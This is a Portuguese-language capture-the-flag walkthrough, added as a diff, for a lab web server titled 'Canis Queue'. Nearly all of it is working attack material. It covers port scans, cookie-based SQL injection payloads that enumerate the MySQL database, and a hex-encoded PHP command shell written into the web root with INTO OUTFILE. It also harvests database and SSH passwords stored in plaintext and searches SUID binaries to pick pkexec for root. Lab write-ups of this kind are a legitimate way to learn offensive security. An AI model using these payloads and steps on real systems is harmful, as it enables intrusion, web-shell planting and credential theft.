@@ -1,0 +1,151 @@
+--> sudo rustscan -a 10.67.163.54
+
+Open 10.67.163.54:22
+Open 10.67.163.54:80
+
+--> sudo nmap -sV -sC -Pn -p 22,80 10.67.163.54
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)
+|   256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)
+|_  256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Canis Queue
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+INTERCEPTANDO A REQUISIÇÃO:
+
+GET / HTTP/1.1
+Host: 10.67.163.54
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: id=b44eb7750fa1d84ca709d2e24ccac78f --> PASSANDO O COOKIE COMO ID
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+SESSÃO ALTERADA:
+
+GET / HTTP/1.1
+Host: 10.67.163.54
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: id=b44eb7750fa1d84ca709d2e24ccac78f' UNION SELECT null,@@datadir# --> PAYLOAD PASSADO!
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+DESCOBRINDO O BANCO DE DADOS:
+
+GET / HTTP/1.1
+Host: 10.67.163.54
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: id=b44eb7750fa1d84ca709d2e24ccac78f' UNION SELECT null,schema_name from information_schema.schemata# --> WEBAPP
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+DESCOBRINDO A VERSÃO E CAMINHO DO BANCO DE DADOS:
+
+GET / HTTP/1.1
+Host: 10.67.163.54
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: id=b44eb7750fa1d84ca709d2e24ccac78f' UNION SELECT null,group_concat(@@datadir,version())'# --> /var/lib/mysql/ 5.7.34-0ubuntu0.18.04.1
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+COLOCANDO A MINHA SHELL DENTRO DO SERVIDOR:
+
+GET / HTTP/1.1
+Host: 10.67.163.54
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: id=b44eb7750fa1d84ca709d2e24ccac78f' UNION SELECT null,unhex('3C3F7068702073797374656D28245F4745545B27636D64275D293B3F3E') INTO OUTFILE '/var/www/html/shell.php'#
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+--> URL DA SHELL: http://10.67.163.54/shell.php?cmd=ls
+
+
+ACESSO AO SISTEMA:
+
+--> ARQUIVO config.php:
+
+<?php
+	$servername = "localhost";
+	$username = "web";
+	$password = "Cda3RsDJga";
+	$dbname = "webapp";
+
+	$dbh = new mysqli($servername, $username, $password, $dbname);
+	if ($dbh->connect_error){
+		die("Connection failed: ". $dbh->connect_error);
+	}
+
+
+USERNAME:web
+PASSWORD:Cda3RsDJga
+
+DENTRO DA PASTA DO USUÁRIO dylan TEM UM ARQUIVO CHAMADO work_analysis:
+--> cat work_analysis.txt | grep "password"
+
+USERNAME: dylan
+PASSWORD: Labr4d0rs4L1f3
+
+--> LOGADO NO SSH DO DYLAN dylan:Labr4d0rs4L1f3
+
+
+VIRANDO ROOT:
+
+--> find / -user root -perm -4000 2>/dev/null --> PROCURANDO POR BINÁRIOS COM PERMISSÃO SUID BIT
+
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/traceroute6.iputils
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/chsh
+/usr/bin/pkexec		--> VERSÃO COM VULNERABILIDADE
+/bin/mount
+/bin/umount
+/bin/ping
+/bin/su
+/bin/fusermount
+
+
+AO ENVIAR O EXPLOIT E EXECUTAR, GANHEI ACESSO ROOT!
+
+
+
+
+
+
+
+
+
+
